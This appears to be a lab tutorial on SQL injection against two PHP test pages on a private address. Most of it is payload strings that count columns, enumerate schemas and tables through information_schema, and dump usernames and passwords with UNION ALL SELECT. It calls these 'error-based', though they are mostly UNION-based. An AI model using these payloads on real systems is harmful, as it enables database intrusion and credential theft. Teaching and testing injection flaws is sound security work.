### Error-based SQL Injection

Error-based SQL Injection is a technique used to gather information about the database structure and its content by causing the database server to generate error messages. These error messages can reveal valuable information about the underlying database schema and its data.

#### Types of Error-based SQL Injection Techniques

1. **Query Break**
   - Inject characters like `'`, `"`, or other special characters to break the original query and generate error messages.
   
   Example:
   ```sql
   ' 
   " 
   ```

2. **Query Joined**
   - Use comments and logical operators to manipulate the query and observe how the application responds.
   
   Example:
   ```sql
   --+ 
   # (%23) 
   or '1
   or 1='1
   AND '1
   AND 1='1
   ```

3. **Determine Number of Columns**
   - Use the `ORDER BY` clause to identify the number of columns in the query. Increase the column index until an error occurs to determine the total number of columns.
   
   Example:
   ```sql
   ?id=1' order by 1 --+
   ?id=1' order by 2 --+
   ?id=1' order by 3 --+
   ?id=1' order by 4 --+
   ?id=1' order by 5 --+
   ?id=1' order by 6 --+
   ?id=1' order by 7 --+
   ?id=1' order by 8 --+
   ?id=1' order by 9 --+
   ```

4. **Run Multiple SELECT Statements Using UNION ALL**
   - Use the `UNION ALL` operator to combine results from multiple SELECT statements. This can be used to extract unauthorized information.
   
   Example:
   ```sql
   ?id=-1' union all select 1,2,3,4,5 --+
   ?id=-1' union all select database(), current_user, 3, 4, 5 --+
   ?id=-1' union all select database(), version(), 3, 4, 5 --+
   ```

5. **Retrieve Database Names**
   - Extract the names of all databases using queries against the `information_schema` tables.
   
   Example:
   ```sql
   ?id=-1' union all select table_schema, 2, 3, 4, 5 from information_schema.tables GROUP BY table_schema --+
   ```

6. **Retrieve Table Names**
   - Extract table names from a specific database using `information_schema`.
   
   Example:
   ```sql
   ?id=-1' union all select table_name, 2, 3, 4, 5 from information_schema.tables where table_schema="employe_db" --+
   ```

7. **Retrieve Column Names**
   - Extract column names from a specific table within a database.
   
   Example:
   ```sql
   ?id=-1' union all select column_name, 2, 3, 4, 5 from information_schema.columns where table_schema="employe_db" AND table_name="users" --+
   ```

8. **Extract Data from Columns**
   - Retrieve sensitive data such as usernames and passwords from a table.
   
   Example:
   ```sql
   ?id=-1' union all select name, password, 3, 4, 5 from users --+
   ```

9. **Concatenate Data for Output**
   - Use `GROUP_CONCAT` to concatenate and display data in a single line.
   
   Example:
   ```sql
   ?id=-1' union all select group_concat(name), group_concat(password), 3, 4, 5 from users --+
   ```

## Example SQL Injection Queries

### Error-Based String SQL Injection

#### error-based-string-get.php

**Example URL:**
- `http://192.168.43.2/error-based-string-get.php`


**Original Query in the File:**
```sql
SELECT * FROM users WHERE id=('1')
```

**Injection Queries:**

```sql
-1') UNION ALL SELECT CURRENT_USER(), 2, 3, 4, 5 --+
```

```sql
-1') UNION ALL SELECT table_schema, 2, 3, 4, 5 FROM information_schema.tables GROUP BY table_schema --+
```

```sql
-1') UNION ALL SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables WHERE table_schema="employe_db" --+
```

```sql
-1') UNION ALL SELECT COLUMN_NAME, 2, 3, 4, 5 FROM information_schema.columns WHERE table_schema="employe_db" AND TABLE_NAME="users" --+
```

```sql
-1') UNION ALL SELECT name, password, 3, 4, 5 FROM employe_db.users --+
```

```sql
-1') UNION ALL SELECT GROUP_CONCAT(name), GROUP_CONCAT(password), 3, 4, 5 FROM employe_db.users --+
```

```sql
-1') UNION ALL SELECT GROUP_CONCAT(name), GROUP_CONCAT(password), 3, 4, 5 FROM employe_db.users LIMIT 0,1 --+
```

**Explanation:**
The `error-based-string-get.php` file is vulnerable to SQL Injection. The query `SELECT * FROM users WHERE id=('1')` is used with a filter that attempts to control input. However, attackers can bypass this filter by manipulating the input with the `UNION` operator. For example, they use payloads like `-1') UNION ALL SELECT CURRENT_USER(), 2, 3, 4, 5 --+` to combine results from multiple queries. This allows them to retrieve sensitive data such as the current user, database schema, table names, column names, and even user credentials from the `employe_db` database. By chaining these payloads, attackers can effectively extract detailed information despite the initial filter.

#### error-based-string-post.php

**Example URL:**
- `http://192.168.43.2/error-based-string-post.php`

**Original Query in the File:**
```sql
SELECT * FROM users WHERE id='1'
```

**Injection Queries:**

```sql
1' UNION ALL SELECT CURRENT_USER(), 2, 3, 4, 5 -- 
```

```sql
1' UNION ALL SELECT table_schema, 2, 3, 4, 5 FROM information_schema.tables GROUP BY table_schema --+
```

```sql
1' UNION ALL SELECT table_name, 2, 3, 4, 5 FROM information_schema.tables WHERE table_schema="employe_db" --+
```

```sql
1' UNION ALL SELECT COLUMN_NAME, 2, 3, 4, 5 FROM information_schema.columns WHERE table_schema="employe_db" AND TABLE_NAME="users" --+
```

```sql
1' UNION ALL SELECT name, password, 3, 4, 5 FROM employe_db.users --+
```

```sql
1' UNION ALL SELECT GROUP_CONCAT(name), GROUP_CONCAT(password), 3, 4, 5 FROM employe_db.users --+
```

**Explanation:**
The `error-based-string-post.php` file is also vulnerable to SQL Injection. The query `SELECT * FROM users WHERE id='1'` is used with user-provided input, which can be manipulated by attackers. By injecting payloads such as `1' UNION ALL SELECT CURRENT_USER(), 2, 3, 4, 5 --`, attackers can execute additional SQL commands to combine query results. This approach allows them to bypass the filter and access sensitive information, including the current database user, schema details, table names, column names, and user passwords. The `GROUP_CONCAT` function in payloads like `1' UNION ALL SELECT GROUP_CONCAT(name), GROUP_CONCAT(password), 3, 4, 5 FROM employe_db.users --+` enables attackers to gather all usernames and passwords into a single result, facilitating data extraction from the `employe_db` database.

---

These explanations provide a detailed view of how each SQL Injection example operates, highlighting the impact and techniques used in each case.
